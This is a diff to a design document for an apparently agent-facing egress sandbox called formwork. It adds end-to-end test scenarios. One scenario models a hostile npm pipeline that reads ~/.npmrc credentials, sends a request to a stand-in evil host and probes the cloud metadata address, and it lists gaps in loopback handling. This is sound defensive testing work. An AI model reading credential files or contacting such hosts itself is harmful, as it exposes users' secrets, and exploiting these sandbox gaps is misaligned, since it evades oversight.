+2. The `~/.npmrc` read is denied by the credential floor (`npm` type), so the query carries nothing.
+   The telemetry request is refused, and `learn` proposes `https:telemetry.evil.example`: `learn`
+   proposes every observed host outside the floor, and the operator's review is where a hostile host
+   is rejected. It is not a malware filter.
+3. The metadata request is withheld and itemized, never proposed.
+4. `npm ci` stops at its first failed fetch, so a pipeline with several missing hosts can take one
+   `learn` pass per host.
+
+**Test form — `FW-E2E-105` (Phase A, both OSes; extends FEP-5 `FW-E2E-085`).**
+`registry.npmjs.org`, `codeload.github.com` and `telemetry.evil.example` become `npm.test`,
+`codeload.test` and `evil.test`.
+
+| # | Step | Expected |
+|---|---|---|
+| 1 | outside: `formwork learn --blueprint ci.toml -- npm ci` | the proposal holds `https:codeload.test` and `https:evil.test`, each with provenance; `169.254.169.254` is itemized as withheld |
+| 2 | outside: accept `https:codeload.test` only (`formwork learn --accept`) | the discovered layer holds that one rule |
+| 3 | `npm ci` under the accepted blueprint | succeeds; `evil.test` logs nothing; violation `host-not-listed` for `evil.test` |
+
+Pass: every row as stated. Fail: the metadata address is proposed, or `evil.test` receives a request.
+
+#### S10. A test server inside the session
+
+**Configuration.** S1, in a project whose `npm test` starts an HTTP server on `127.0.0.1:0` and
+requests it.
+
+**Where it fits.** Test suites that start a local server (Express, Flask, a mock API) and call it are
+common, and they run inside the same session as the agent.
+
+**How it works today, and what is missing.** Two things break it under FEP-5 as drafted. The Launcher
+empties `NO_PROXY`, so an HTTP client sends `http://127.0.0.1:3000/` to the engine, which refuses an
+unlisted IP literal. A client that connects directly is refused by the supervisor, which admits only
+the Gateway endpoint (§11, "In-session loopback"). The resolution this test accepts: the Launcher
+sets `NO_PROXY=localhost,127.0.0.1,::1`, and the supervisor admits a loopback `connect()` whose port
+is bound by a session process.
+
+**Test form — `FW-E2E-106` (blocked on §11; Linux first).** A harness fixture outside the session
+listens on `127.0.0.1:<port>`.
+
+| # | Step | Expected |
+|---|---|---|
+| 1 | `node -e` script: listen on `127.0.0.1:0`, then `fetch` it | succeeds |
+| 2 | `curl -sS http://127.0.0.1:<fixture port>/` | refused; refusal record; the fixture logs nothing |
+
+Pass: row 1 succeeds and row 2 is refused. Fail: row 1 is refused, or row 2 reaches the fixture. The
+macOS form waits for a Seatbelt design that can tell a session-bound port from a host service.
+
+### 7.3 Tests
 
 Draft numbers continue above `FW-E2E-091` and `FW-ADV-020`.
 
@@ -714,9 +1218,10 @@ Draft numbers continue above `FW-E2E-091` and `FW-ADV-020`.
 The parsers in `FW-ADV-024` (authority, path canonicalization, ClientHello buffering) are also fuzz
 targets once the fuzz infrastructure that `docs/STATUS.md` defers exists.
 
-### 7.3 Phasing
+### 7.4 Phasing
 
 Each phase lands with the FEP-5 phase that needs it, and the report is honest at every boundary.
+A phase is accepted when the §7.2 scenarios marked with it pass on both CI operating systems.
 
 - **Phase A**, with FEP-5 Phase 2: the front door, authority parsing, the host table, destination
   classification, tunnel grade, plain HTTP, records. `FW-EGR16`–`FW-EGR19`, `FW-EGR21`,
@@ -861,9 +1366,12 @@ a bound host whose only inspected rule forwards without TLS (port 80), naming th
   resolver answering from the host table is one design.
 - **In-session loopback (raised for FEP-5).** Under host rules, FEP-5's supervisor and macOS
   profile refuse a `connect()` to `127.0.0.1:<port>` even when the listener belongs to the session,
-  which breaks test suites that start a local server. Admitting loopback connections to ports bound
-  by session processes closes this on Linux; on macOS, SBPL cannot express "bound by the session",
-  and `localhost:*` would open every host service on loopback.
+  which breaks test suites that start a local server; and because the Launcher empties `NO_PROXY`,
+  an HTTP client sends even a loopback request to the engine. Setting
+  `NO_PROXY=localhost,127.0.0.1,::1` and admitting loopback connections to ports bound by session
+  processes closes this on Linux; on macOS, SBPL cannot express "bound by the session", and
+  `localhost:*` would open every host service on loopback. S10 (`FW-E2E-106`) is the acceptance
+  test.
 - **Non-HTTP TCP.** SSH to a Git host and database protocols need a rule form for a port-scoped fd
   (FEP-1, [FW-GW6](../formwork.md#fw-gw6)). A grammar proposal belongs with FEP-5's `rules`.
 - **Encrypted Client Hello.** Refused today as a server-name mismatch. If an agent toolchain enables
